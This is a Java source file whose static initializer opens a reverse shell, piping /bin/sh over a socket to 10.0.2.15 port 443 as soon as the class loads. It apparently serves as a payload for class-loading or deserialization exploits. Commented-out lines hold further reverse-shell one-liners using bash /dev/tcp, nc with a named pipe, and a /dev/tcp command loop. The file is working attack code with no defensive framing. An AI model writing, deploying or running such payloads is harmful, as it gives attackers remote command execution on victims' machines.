import java.net.*;
import java.io.*;

public class shell2 {

    static {
        try {
            //String[] cmd = {"/usr/bin/mate-calc"};
            //String[] cmd = {"/bin/bash -i >& /dev/tcp/10.0.2.15/443 0>&1"};
            //String[] cmd = {"mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 127.0.0.1 443 1>/tmp/backpipe"};
            //Runtime.getRuntime().exec(cmd).waitFor();
	//	r = Runtime.getRuntime();
	//	p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);
	//	p.waitFor();
	String host="10.0.2.15";
	int port=443;
	String cmd="/bin/sh";
	Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
	Socket s=new Socket(host,port);
	InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
	OutputStream po=p.getOutputStream(),so=s.getOutputStream();
	while(!s.isClosed())
	{
		while(pi.available()>0)so.write(pi.read());
		while(pe.available()>0)so.write(pe.read());
		while(si.available()>0)po.write(si.read());
		so.flush();
		po.flush();
		Thread.sleep(50);
		try {
			p.exitValue();
			break;
		}
		catch (Exception e)
		{}
	};
	p.destroy();
	s.close();
	} 
	
	catch (Exception e) {
            e.printStackTrace();
        }
    }
}
